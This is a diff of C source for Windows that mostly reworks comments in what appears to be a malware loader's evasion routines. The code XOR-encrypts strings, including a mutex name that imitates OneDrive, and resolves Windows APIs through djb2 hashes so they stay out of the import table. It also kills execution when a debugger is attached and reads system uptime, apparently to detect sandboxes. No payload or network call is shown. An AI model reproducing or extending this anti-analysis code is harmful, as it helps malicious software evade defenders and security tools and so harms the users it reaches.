@@ -3,7 +3,7 @@
 #include <stdio.h>
 #include <intrin.h>
 
-// --- TYPEDEFS per API Hashing ---
+// --- TYPEDEFS DEFINITION
 typedef HANDLE (WINAPI *pCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
 typedef DWORD (WINAPI *pGetLastError)(void);
 typedef BOOL (WINAPI *pIsDebuggerPresent)(void);
@@ -22,33 +22,33 @@ void xor_crypt(char *data, size_t data_len, const char *key, size_t key_len) {
 }
 
 bool check_mutex() {
-
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
 
+    // --- ENCODED STRINGS DEFINITION
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
-    
-    // string: "Global\\OneDriveSyncMutex"
-    char enc_mutex[] = { 0x18, 0x1f, 0x1a, 0x12, 0x52, 0x1f, 0x6f, 0x2c, 0x1c, 0x56, 0x30, 0x19, 0x5a, 0x0f, 0x3a, 0x0c, 0x0a, 0x1b, 0x13, 0x7e, 0x06, 0x47, 0x06, 0x0a, 0x33 };
+    char enc_mutex[] = { 0x18, 0x1f, 0x1a, 0x12, 0x52, 0x1f, 0x6f, 0x2c, 0x1c, 0x56, 0x30, 0x19, 0x5a, 0x0f, 0x3a, 0x0c, 0x0a, 0x1b, 0x13, 0x7e, 0x06, 0x47, 0x06, 0x0a, 0x33 };        // "Global\\OneDriveSyncMutex"
 
-    // API hashes
+    // --- API HASHES DEFINITION
     DWORD hash_CreateMutexA = 0x6FA1320D;  // djb2 for "CreateMutexA"
     DWORD hash_GetLastError = 0x2082EAE3;  // djb2 for "GetLastError"
 
-    // kernel32.dll
+    // --- DYNAMIC DLL LOAD
+
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
     if (!hKernel32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- DYNAMIC API RESOLUTION VIA HASHING
+
     pCreateMutexA fnCreateMutexA = (pCreateMutexA) get_api_by_hash(hKernel32, hash_CreateMutexA);
     pGetLastError fnGetLastError = (pGetLastError) get_api_by_hash(hKernel32, hash_GetLastError);
 
     if (!fnCreateMutexA || !fnGetLastError) return false;
 
     xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
-    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);     // create mutex
+    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);
     xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
 
     // check if already running
@@ -62,26 +62,29 @@ bool check_mutex() {
 bool check_debugger() {
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
 
+    // --- ENCODED STRINGS DEFINITION
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
 
-    // API hashes
+    // --- API HASHES DEFINITION
     DWORD hash_IsDebuggerPresent = 0xE6A24847; // djb2 for "IsDebuggerPresent"
 
-    // kernel32.dll
+    // --- DYNAMIC DLL LOAD
+
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
     if (!hKernel32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- DYNAMIC API RESOLUTION VIA HASHING
+
     pIsDebuggerPresent fnIsDebuggerPresent = (pIsDebuggerPresent) get_api_by_hash(hKernel32, hash_IsDebuggerPresent);
 
     if (!fnIsDebuggerPresent) return false;
 
     // check if a debugger is attached
     if (fnIsDebuggerPresent()) {
-        return false; // debugger found, kill execution
+        return false; // kill execution
     }
 
     return true;
@@ -90,19 +93,22 @@ bool check_debugger() {
 bool check_uptime() {
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
 
+    // --- ENCODED STRINGS DEFINITION
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
 
-    // API hashes
+    // --- API HASHES DEFINITION
     DWORD hash_GetTickCount64 = 0x614DB023;    // djb2 for "GetTickCount64"
 
-    // kernel32.dll
+    // --- DYNAMIC DLL LOAD
+
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
     if (!hKernel32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- DYNAMIC API RESOLUTION VIA HASHING
+    
     pGetTickCount64 fnGetTickCount64 = (pGetTickCount64) get_api_by_hash(hKernel32, hash_GetTickCount64);
 
     if (!fnGetTickCount64) return false;
